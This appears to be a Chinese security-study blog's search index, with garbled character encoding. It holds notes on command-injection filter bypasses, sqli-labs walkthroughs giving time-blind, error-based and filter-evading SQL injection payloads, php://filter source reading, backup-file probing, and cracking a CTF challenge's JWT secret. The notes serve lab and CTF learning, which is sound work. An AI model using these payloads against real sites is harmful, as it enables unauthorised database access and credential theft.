é€’ç»™è¯¥shellè„šæœ¬çš„ç¬¬ä¸€ä¸ªå‚æ•°</li><li>$2 æ˜¯ä¼ é€’ç»™è¯¥shellè„šæœ¬çš„ç¬¬äºŒä¸ªå‚æ•°</li><li>$@ æ˜¯ä¼ ç»™è„šæœ¬çš„æ‰€æœ‰å‚æ•°çš„åˆ—è¡¨</li><li>$* æ˜¯ä»¥ä¸€ä¸ªå•å­—ç¬¦ä¸²æ˜¾ç¤ºæ‰€æœ‰å‘è„šæœ¬ä¼ é€’çš„å‚æ•°ï¼Œä¸ä½ç½®å˜é‡ä¸åŒï¼Œå‚æ•°å¯è¶…è¿‡9ä¸ª</li><li>$$ æ˜¯è„šæœ¬è¿è¡Œçš„å½“å‰è¿›ç¨‹IDå·</li><li>$? æ˜¯æ˜¾ç¤ºæœ€åå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ï¼Œ0è¡¨ç¤ºæ²¡æœ‰é”™è¯¯ï¼Œå…¶ä»–è¡¨ç¤ºæœ‰é”™è¯¯</li></ul></blockquote><h2 id="catè¢«è¿‡æ»¤"><a href="#catè¢«è¿‡æ»¤" class="headerlink" title="catè¢«è¿‡æ»¤"></a>catè¢«è¿‡æ»¤</h2><blockquote><p>more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹<br>less:ä¸ more ç±»ä¼¼<br>head:æŸ¥çœ‹å¤´å‡ è¡Œ<br>tac:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„åå‘æ˜¾ç¤º<br>tail:æŸ¥çœ‹å°¾å‡ è¡Œ<br>nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·<br>od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹<br>vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹<br>vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹<br>sort:å¯ä»¥æŸ¥çœ‹<br>uniq:å¯ä»¥æŸ¥çœ‹<br>file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹</p></blockquote><h2 id="å†…æ•›æ‰§è¡Œ"><a href="#å†…æ•›æ‰§è¡Œ" class="headerlink" title="å†…æ•›æ‰§è¡Œ"></a>å†…æ•›æ‰§è¡Œ</h2><blockquote><p>cat$IFS$9<code>ls</code><br>cat$IFS$9$(ls)</p></blockquote><p>(å†…è”ï¼Œå°±æ˜¯å°†&#96;&#96;æˆ–$()å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥æ‰§è¡Œ)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>æ¯å‘¨æŠ¥å‘Š</title>
    <link href="/2023/04/19/my-blogneirong/"/>
    <url>/2023/04/19/my-blogneirong/</url>
    
    <content type="html"><![CDATA[<h2 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h2><p>åœ¨é€šå…³sqllabsç¬¬9å…³ä¸ç¬¬10å…³æ—¶æˆ‘ä»¬çŸ¥é“äº†æ—¶é—´ç›²æ³¨è¿™ä¸€æ¦‚å¿µï¼Œ<br>ç”¨æ—¶é—´ç›²æ³¨æ¥åˆ¤æ–­æ³¨å…¥ç‚¹æ˜¯å¦æ­£ç¡®ï¼Œä½¿ç”¨sleepå»¶è¿Ÿå‡½æ•°ã€‚<br>if()å‡½æ•°æ¡ä»¶åˆ¤æ–­å‡½æ•°<br>if(a,b,c)   ifåˆ¤æ–­å¥ï¼Œaä¸ºæ¡ä»¶ï¼Œbã€cä¸ºæ‰§è¡Œè¯­å¥ï¼›å¦‚æœaä¸ºçœŸå°±æ‰§è¡Œbï¼Œaä¸ºå‡å°±æ‰§è¡Œc;<br>sleep()å‡½æ•°ç½‘é¡µå»¶è¿Ÿnç§’åï¼Œè¾“å‡ºç»“æœ<br>leftï¼ˆï¼‰å‡½æ•°             ä»å·¦è¾¹æ•°ï¼Œå–å‡ ä¸ªæ•°<br>ä¾‹å¦‚ï¼šleftï¼ˆabcdefï¼Œ3ï¼‰  å–3ä½å·¦è¾¹çš„æ•°ï¼Œå°±æ˜¯abc  </p><ol><li>åˆ¤æ–­æ³¨å…¥ç‚¹ï¼š?id&#x3D;1 and sleep(10)â€“+ å¦‚è‹¥é¡µé¢åŠ è½½åˆ™åˆ¤æ–­æ­£ç¡®ï¼Œå¦åˆ™å°è¯•å…¶ä»–</li><li>çˆ†åº“ï¼š?id&#x3D;1â€™ and if (length(database()) &#x3D; 8 ,sleep(4),1)â€“+ å¦‚è‹¥å»¶æ—¶åˆ™æ­£ç¡®ï¼Œ?id&#x3D;1â€™ and If((substr(database(),1,1)&#x3D;â€™sâ€™),sleep(5),1)â€“+ æŒ¨ä¸ªå°è¯•æ‰¾å‡ºå…«ä¸ªå­—ç¬¦åº“åsecurity</li><li>çˆ†è¡¨åï¼š?id&#x3D;1â€™ and If((substr((select table_name from information_schema.tables where table_schema&#x3D;â€™securityâ€™ limit 3,1),1,1))&#x3D;â€˜uâ€˜,sleep(4),1)â€“+ ç­‰äºusers</li><li>çˆ†å­—æ®µï¼š?id&#x3D;1â€™ and If(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;â€™usersâ€™ and table_schema&#x3D;database() limit 0,1),1,1))&#x3D;105,sleep(4),1)â€“+</li><li>çˆ†æ•°æ®ï¼š?id&#x3D;1â€™ and If( (substr((select username from users limit 0,1),1,1))&#x3D;â€™aâ€™,sleep(4),1)â€“+</li></ol><h2 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><p>åœ¨sqllabs ç¬¬13å…³ä¸­ï¼Œå¯ä»¥æµ‹è¯•å‡ºé—­åˆç‚¹ï¼Œä½†æ²¡æœ‰å›æ˜¾ä½ï¼Œæ— æ³•é‡å¤11ï¼Œ12é¢˜ä¸­çš„æ“ä½œï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°è¯•ä½¿ç”¨æŠ¥é”™æ³¨å…¥<br>1â€™)  and updatexml(1,concat(0x7e,(database()),0x7e),1) #<br><strong>è™½ç„¶æŠ¥é”™ï¼Œä½†æˆ‘ä»¬çŸ¥é“äº†åº“åä¸ºsecurity</strong><br>1â€™)  and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;â€™securityâ€™ and table_name&#x3D;â€™usersâ€™),0x7e),1) #<br><strong>å†æ±‚å¾—è¡¨å</strong><br>1â€™)  and updatexml(1,concat(0x7e,(select group_concat(username)from users),0x7e),1) #<br><strong>å†æ±‚å¾—å­—æ®µ</strong><br>å¯æ±‚å¾—username å’Œ password</p><h2 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h2><p>åœ¨24å…³ä¸­éœ€è¦ç”¨åˆ°äºŒæ¬¡æ³¨å…¥çš„åŸç†ï¼ŒäºŒæ¬¡æ³¨å…¥å¯ä»¥ç†è§£ä¸ºï¼Œæ”»å‡»è€…æ„é€ çš„æ¶æ„æ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“åï¼Œæ¶æ„æ•°æ®è¢«è¯»å–å¹¶è¿›å…¥åˆ°SQLæŸ¥è¯¢è¯­å¥æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚é˜²å¾¡è€…å¯èƒ½åœ¨ç”¨æˆ· è¾“å…¥æ¶æ„æ•°æ®æ—¶å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œä½†åœ¨æ¶æ„æ•°æ®æ’å…¥åˆ°æ•°æ®åº“æ—¶è¢«å¤„ç†çš„æ•°æ®åˆè¢«è¿˜åŸå¹¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå½“webç¨‹åºè°ƒç”¨å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„æ•°æ®å¹¶æ‰§è¡ŒSQLæŸ¥è¯¢æ—¶ï¼Œå°±å‘ç”Ÿäº†SQLäºŒæ¬¡æ³¨å…¥ã€‚<br><strong>ç¬¬ä¸€æ­¥ï¼šæ’å…¥æ¶æ„æ•°æ®</strong><br>è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®æ—¶ï¼Œå¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œåœ¨å†™å…¥æ•°æ®åº“çš„æ—¶å€™åˆä¿ç•™äº†åŸæ¥çš„æ•°æ®ã€‚<br><strong>ç¬¬äºŒæ­¥ï¼šå¼•ç”¨æ¶æ„æ•°æ®</strong><br>å¼€å‘è€…é»˜è®¤å­˜å…¥æ•°æ®åº“çš„æ•°æ®éƒ½æ˜¯å®‰å…¨çš„ï¼Œåœ¨è¿›è¡ŒæŸ¥è¯¢çš„æ—¶å€™ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºæ¶æ„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€éªŒçš„å¤„ç†ã€‚</p><h2 id="è¿‡æ»¤"><a href="#è¿‡æ»¤" class="headerlink" title="è¿‡æ»¤"></a>è¿‡æ»¤</h2><p>åœ¨25ï¼Œ26å…³éƒ½è¿‡æ»¤äº†orå’Œand æ‰€ä»¥é‡åˆ°æœ‰oræˆ–andçš„åœ°æ–¹éœ€è¦åŒå†™ï¼Œ<br>ä¾‹ï¼šinformation-&gt;information&amp;&amp;password-&gt;passwoorrd<br>ä½†26å…³ä¹Ÿè¿‡æ»¤æ‰äº†ç©ºæ ¼å’Œæ³¨é‡Šç¬¦ï¼Œè¿™æ—¶å¯ä»¥é‡‡ç”¨æŠ¥é”™æ³•æ±‚å¾—ï¼Œç©ºæ ¼å¯ç”¨â€œ%a0â€ æˆ– â€œ%0bâ€ æ›¿ä»£ç©ºæ ¼ï¼ŒåŒæ—¶å¯ä»¥ä½¿ç”¨ï¼‰æ¥ä»£æ›¿ç©ºæ ¼çš„åˆ’åˆ†ä½œç”¨ï¼Œä½¿ç”¨ â€œ||â€ æ›¿ä»£ â€œorâ€ï¼Œä½¿ç”¨ â€œ%26%26â€ æ›¿ä»£ â€œandâ€ã€‚<br><strong>ç®¡é“ç¬¦ï¼ˆLinuxç®¡é“å‘½ä»¤æ“ä½œç¬¦ï¼‰ï¼š</strong><br><img src="/./images/heiheihei.jpg" alt="Linuxç®¡é“å‘½ä»¤æ“ä½œç¬¦"><br>Linux-&gt;ls-&gt;list-&gt;åˆ—è¡¨-&gt;æ˜¾ç¤ºæŒ‡å®šå·¥ä½œç›®å½•ä¸‹çš„å†…å®¹<br>Linux-&gt;cat-&gt;ç”¨äºè¿æ¥æ–‡ä»¶å¹¶æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ä¸Š</p><h2 id="filterä¼ªåè®®"><a href="#filterä¼ªåè®®" class="headerlink" title="filterä¼ªåè®®"></a>filterä¼ªåè®®</h2><p>php:&#x2F;&#x2F;filteræ˜¯phpä¸­ç‹¬æœ‰çš„ä¸€ç§åè®®ï¼Œå®ƒæ˜¯ä¸€ç§è¿‡æ»¤å™¨ï¼Œå¯ä»¥ä½œä¸ºä¸€ä¸ªä¸­é—´æµæ¥è¿‡æ»¤å…¶ä»–çš„æ•°æ®æµã€‚é€šå¸¸ä½¿ç”¨è¯¥åè®®æ¥è¯»å–æˆ–è€…å†™å…¥éƒ¨åˆ†æ•°æ®ï¼Œä¸”åœ¨è¯»å–å’Œå†™å…¥ä¹‹å‰å¯¹æ•°æ®è¿›è¡Œä¸€äº›è¿‡æ»¤ï¼Œä¾‹å¦‚base64ç¼–ç å¤„ç†ï¼Œrot13å¤„ç†ç­‰ã€‚å®˜æ–¹è§£é‡Šä¸ºï¼šphp:&#x2F;&#x2F;filter æ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚è¿™å¯¹äºä¸€ä½“å¼ï¼ˆall-in-oneï¼‰çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼ readfile()ã€ file() å’Œ file_get_contents()ï¼Œåœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚<br>Filteråè®®çš„ä¸€èˆ¬è¯­æ³•ä¸ºï¼šphp:&#x2F;&#x2F;filter&#x2F;è¿‡æ»¤å™¨|è¿‡æ»¤å™¨&#x2F;resource&#x3D;å¾…è¿‡æ»¤çš„æ•°æ®æµ<br><strong>é€šè¿‡php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D; åˆ©ç”¨LFIæ¥æŸ¥çœ‹æºç </strong><br><a href="https://blog.csdn.net/qq_29419013/article/details/81201494">filterè¯¦ç»†ä¿¡æ¯</a><br><a href="https://zhuanlan.zhihu.com/p/50445145">filterè¯¦ç»†ä¿¡æ¯</a></p><h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h2><p>å¦‚æœæœåŠ¡å™¨ä¼ å…¥æ•°æ®åº“çš„æ•°æ®æ˜¯gbkç­‰å®½å­—èŠ‚ç¼–ç ï¼Œå¯ä»¥åœ¨ç‰¹æ®Šå­—ç¬¦ä¹‹å‰å¢åŠ ä¸€ä¸ªåå…­è¿›åˆ¶å­—èŠ‚ï¼Œå’Œè½¬ä¹‰ç¬¦æ„æˆä¸€ä¸ªæ±‰å­—å­—ç¬¦ï¼Œä»è€ŒæŠŠè½¬ä¹‰ç¬¦åƒæ‰ã€‚<br><a href="https://blog.csdn.net/weixin_42040292/article/details/90719507">å®½å­—èŠ‚æ³¨å…¥</a><br><strong>Referer: æœåŠ¡å™¨ä¼ªé€ </strong><br><strong>X-Forwarded-For:ç”¨äºä¿®æ”¹ip</strong></p><p><strong>å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åç¼€:</strong></p><ul><li>tar.gzï¼Œzipï¼Œrarï¼Œtar<br><strong>å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åï¼š</strong><br>webï¼Œwebsiteï¼Œbackupï¼Œbackï¼Œwwwï¼Œwwwrootï¼Œtemp<br><strong>å¸¸è§çš„å¤‡ä»½æ–‡ä»¶åç¼€åæœ‰ï¼š</strong></li><li>.git .svn .swp .~ .bak .bash_history</li></ul><h2 id="phpåºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#phpåºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="phpåºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>phpåºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h2><p> <strong>åºåˆ—åŒ–</strong>æ˜¯å°†å˜é‡è½¬æ¢ä¸ºå¯ä¿å­˜æˆ–ä¼ è¾“çš„å­—ç¬¦ä¸²çš„è¿‡ç¨‹ï¼›<strong>ååºåˆ—åŒ–</strong>å°±æ˜¯åœ¨é€‚å½“çš„æ—¶å€™æŠŠè¿™ä¸ªå­—ç¬¦ä¸²å†è½¬åŒ–æˆåŸæ¥çš„å˜é‡ä½¿ç”¨ã€‚è¿™ä¸¤ä¸ªè¿‡ç¨‹ç»“åˆèµ·æ¥ï¼Œå¯ä»¥è½»æ¾åœ°å­˜å‚¨å’Œä¼ è¾“æ•°æ®ï¼Œä½¿ç¨‹åºæ›´å…·ç»´æŠ¤æ€§ã€‚</p><p> <strong>å¼±æ¯”è¾ƒï¼š</strong>å¦‚æœæ¯”è¾ƒä¸€ä¸ªæ•°å­—å’Œå­—ç¬¦ä¸²æˆ–è€…æ¯”è¾ƒæ¶‰åŠåˆ°æ•°å­—å†…å®¹çš„å­—ç¬¦ä¸²ï¼Œåˆ™å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆæ•°å€¼å¹¶ä¸”æ¯”è¾ƒæŒ‰ç…§æ•°å€¼æ¥è¿›è¡Œï¼Œåœ¨æ¯”è¾ƒæ—¶è¯¥å­—ç¬¦ä¸²çš„å¼€å§‹éƒ¨åˆ†å†³å®šäº†å®ƒçš„å€¼ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å€¼å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å€¼ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>å¸¸è§æ¼æ´</title>
    <link href="/2023/01/26/%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/01/26/%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="JWTä¼ªé€ æ¼æ´"><a href="#JWTä¼ªé€ æ¼æ´" class="headerlink" title="JWTä¼ªé€ æ¼æ´"></a>JWTä¼ªé€ æ¼æ´</h1><h2 id="JSON-Web-Token"><a href="#JSON-Web-Token" class="headerlink" title="JSON Web Token"></a>JSON Web Token</h2><p>JSON Web Token(JWT)æ˜¯ä¸€ä¸ªå¼€æ”¾æ ‡å‡†(RFC 7519),å®ƒå®šä¹‰äº†ä¸€ç§ç´§å‡‘çš„ã€è‡ªåŒ…å«çš„æ–¹å¼ï¼Œç”¨äºä½œä¸ºJSONå¯¹è±¡åœ¨å„æ–¹ä¹‹é—´å®‰å…¨çš„ä¼ è¾“ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯å¯ä»¥è¢«éªŒè¯å’Œä¿¡ä»»ï¼Œå› ä¸ºå®ƒæ˜¯æ•°å­—ç­¾åçš„ã€‚</p><h2 id="ä»€ä¹ˆæ—¶å€™åº”è¯¥ç”¨JSON-Web-Tokens"><a href="#ä»€ä¹ˆæ—¶å€™åº”è¯¥ç”¨JSON-Web-Tokens" class="headerlink" title="ä»€ä¹ˆæ—¶å€™åº”è¯¥ç”¨JSON Web Tokens"></a>ä»€ä¹ˆæ—¶å€™åº”è¯¥ç”¨JSON Web Tokens</h2><p>ä¸‹åˆ—åœºæ™¯ä¸­ä½¿ç”¨JSON Web Tokenæ˜¯å¾ˆæœ‰ç”¨çš„ï¼š</p><ul><li><p>Authorization(æˆæƒ)ï¼šè¿™æ˜¯ä½¿ç”¨JWTçš„æœ€å¸¸è§åœºæ™¯ã€‚ä¸€æ—¦ç”¨æˆ·ç™»å½•ï¼Œåç»­æ¯ä¸ªè¯·æ±‚éƒ½å°†åŒ…å«JWTï¼Œå…è®¸ç”¨æˆ·è®¿é—®è¯¥ä»¤ç‰Œå…è®¸çš„è·¯ç”±ã€æœåŠ¡å’Œèµ„æºã€‚å•ç‚¹ç™»å½•æ˜¯ç°åœ¨å¹¿æ³›ä½¿ç”¨JWTçš„ä¸€ä¸ªç‰¹æ€§ï¼Œå› ä¸ºå®ƒçš„å¼€é”€å¾ˆå°ï¼Œå¹¶ä¸”å¯ä»¥è½»æ¾åœ°è·¨åŸŸä½¿ç”¨ã€‚</p></li><li><p>Information Exchange(ä¿¡æ¯äº¤æ¢)ï¼šå¯¹äºå®‰å…¨çš„åœ¨å„æ–¹ä¹‹é—´ä¼ è¾“ä¿¡æ¯è€Œè¨€ï¼ŒJSON Web Tokensæ— ç–‘æ˜¯ä¸€ç§å¾ˆå¥½çš„æ–¹å¼ã€‚å› ä¸ºJWTså¯ä»¥è¢«ç­¾åï¼Œä¾‹å¦‚ï¼Œç”¨å…¬é’¥&#x2F;ç§é’¥å¯¹ï¼Œä½ å¯ä»¥ç¡®å®šå‘é€äººå°±æ˜¯å®ƒä»¬æ‰€è¯´çš„é‚£ä¸ªäººã€‚å¦å¤–ï¼Œç”±äºç­¾åæ˜¯ä½¿ç”¨å¤´å’Œæœ‰æ•ˆè´Ÿè½½è®¡ç®—çš„ï¼Œæ‚¨è¿˜å¯ä»¥éªŒè¯å†…å®¹æ²¡æœ‰è¢«ç¯¡æ”¹ã€‚</p></li></ul><h2 id="JSON-Web-Token-çš„ç»“æ„"><a href="#JSON-Web-Token-çš„ç»“æ„" class="headerlink" title="JSON Web Token çš„ç»“æ„"></a>JSON Web Token çš„ç»“æ„</h2><p><img src="/images/874963-20180709124807031-664967381.png"><br>JSON Web Tokenç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œå®ƒä»¬ä¹‹é—´ç”¨åœ†ç‚¹(.)è¿æ¥ã€‚è¿™ä¸‰éƒ¨åˆ†åˆ†åˆ«æ˜¯ï¼š</p><ul><li>Header</li><li>Payload</li><li>Signature</li></ul><p>å› æ­¤ï¼Œä¸€ä¸ªå…¸å‹çš„JWTçœ‹èµ·æ¥æ˜¯è¿™ä¸ªæ ·å­çš„ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">xxxx<span class="hljs-selector-class">.yyyyy</span>.zzzzz<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œå…·ä½“çœ‹ä¸€ä¸‹æ¯ä¸€éƒ¨åˆ†ï¼š</p><p><strong>Header</strong></p><p>headerå…¸å‹çš„ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼štokençš„ç±»å‹(â€œJWTâ€)å’Œç®—æ³•åç§°(æ¯”å¦‚ï¼šHMAC SHA256æˆ–è€…RSAç­‰ç­‰)ã€‚<br>ä¾‹å¦‚ï¼š<br><img src="/images/874963-20180707143936465-1142974441.png"><br>ç„¶åï¼Œç”¨Base64å¯¹è¿™ä¸ªJSONç¼–ç å°±å¾—åˆ°JWTçš„ç¬¬ä¸€éƒ¨åˆ†</p><p><strong>Payload</strong></p><p>JWTçš„ç¬¬äºŒéƒ¨åˆ†æ˜¯payloadï¼Œå®ƒåŒ…å«å£°æ˜(è¦æ±‚)ã€‚å£°æ˜æ˜¯å…³äºå®ä½“(é€šå¸¸æ˜¯ç”¨æˆ·)å’Œå…¶å®ƒæ•°æ®çš„å£°æ˜ã€‚å£°æ˜æœ‰ä¸‰ç§ç±»å‹ï¼šregisteredï¼Œpublicå’Œprivateã€‚</p><ul><li><p>Registered claims: è¿™é‡Œæœ‰ä¸€ç»„é¢„å®šä¹‰çš„å£°æ˜ï¼Œå®ƒä»¬ä¸æ˜¯å¼ºåˆ¶çš„ï¼Œä½†æ˜¯æ¨èã€‚æ¯”å¦‚:iss(issuer),exp(expiration time), sub(subject),aud(audience)ç­‰ã€‚</p></li><li><p>Public claims: å¯ä»¥éšæ„å®šä¹‰ã€‚</p></li><li><p>Private claims: ç”¨äºåœ¨åŒæ„ä½¿ç”¨å®ƒä»¬çš„å„æ–¹ä¹‹é—´å…±äº«ä¿¡æ¯ï¼Œå¹¶ä¸”ä¸æ˜¯æ³¨å†Œçš„æˆ–å…¬å¼€çš„å£°æ˜ã€‚</p></li></ul><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼š<br><img src="/images/874963-20180707144153274-292205768.png"><br>å¯¹payloadè¿›è¡ŒBase64ç¼–ç å°±å¾—åˆ°JWTçš„ç¬¬äºŒéƒ¨åˆ†</p><p>æ³¨æ„ï¼Œä¸è¦åœ¨JWTçš„payloadæˆ–headerä¸­æ”¾ç½®æ•æ„Ÿä¿¡æ¯ï¼Œé™¤éå®ƒä»¬æ˜¯åŠ å¯†çš„ã€‚</p><p><strong>Sinature</strong></p><p>ä¸ºäº†å¾—åˆ°ç­¾åéƒ¨åˆ†ï¼Œä½ å¿…é¡»æœ‰ç¼–ç è¿‡çš„headerã€ç¼–ç è¿‡çš„payloadã€ä¸€ä¸ªå¯†é’¥ï¼Œç­¾åç®—æ³•æ˜¯headerä¸­æŒ‡å®šçš„é‚£ä¸ªï¼Œç„¶åå¯¹å®ƒä»¬ç­¾åå³å¯ã€‚<br>ä¾‹å¦‚</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">HMACSHA256(<span class="hljs-params">base64UrlEncode</span>(<span class="hljs-params">header</span>)</span> + <span class="hljs-string">&quot;.&quot;</span> + base64<span class="hljs-constructor">UrlEncode(<span class="hljs-params">payload</span>)</span>, secret)<br></code></pre></td></tr></table></figure><p>ç­¾åæ˜¯ç”¨äºéªŒè¯æ¶ˆæ¯åœ¨ä¼ é€’è¿‡ç¨‹ä¸­æœ‰æ²¡æœ‰è¢«æ›´æ”¹ï¼Œå¹¶ä¸”ï¼Œç”±äºä½¿ç”¨ç§é’¥ç­¾åçš„tokenï¼Œå®ƒè¿˜å¯ä»¥éªŒè¯JWTçš„å‘é€æ–¹æ˜¯å¦ä¸ºå®ƒæ‰€ç§°çš„å‘é€æ–¹ã€‚<br>å®˜ç½‘è§£ç å›¾<br><img src="/images/874963-20180707150229764-2037235703.png"><br>å®˜ç½‘åœ°å€<a href="https://jwt.io/">https://jwt.io/</a><br>å¯†é’¥çš„å–å¾—æ–¹æ³•æˆ‘ä»¬ç”±ä¸€ä¸ªé¢˜æ¥å¼•å…¥<br><strong>[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</strong><br><img src="/images/JBFBSKZY4FWH5KWZ7KC.png"><br>ä»cookiesä¸­æŠ“å‡ºJWTæ•°æ®<br>æ”¾åˆ°å®˜ç½‘é‡Œåˆ†æ<br><img src="/images/YUHH2KYYY0T1NMKK4Q.png"><br>æ˜¯æˆ‘ä»¬æ³¨å†Œçš„æ•°æ®æ²¡é”™<br>ç°åœ¨è¦åšçš„å°±æ˜¯ç ´è§£å¯†é’¥<br>è¿™é‡Œæœ‰ä¸ªè„šæœ¬<a href="https://gitcode.com/mirrors/brendan-rius/c-jwt-cracker/overview">c-jwt-cracker</a><br>æˆ‘ä½¿ç”¨çš„æ˜¯kaliï¼Œæ”»å‡»jwt<br><img src="/images/ECFP2LKJ1JB7QPI9LO8.png"><br>è¿™æ ·æˆ‘ä»¬å°±è·å¾—äº†æˆ‘ä»¬çš„å¯†é’¥ï¼Œç„¶åå°†å¯†é’¥å¡«å…¥å¯†åŒ™ä½ç½®åœ¨å®˜ç½‘ç”Ÿæˆä¸€ä¸ªæ–°çš„JWT<br><a href="/buuctf_web.md">åŸé¢˜é“¾æ¥</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
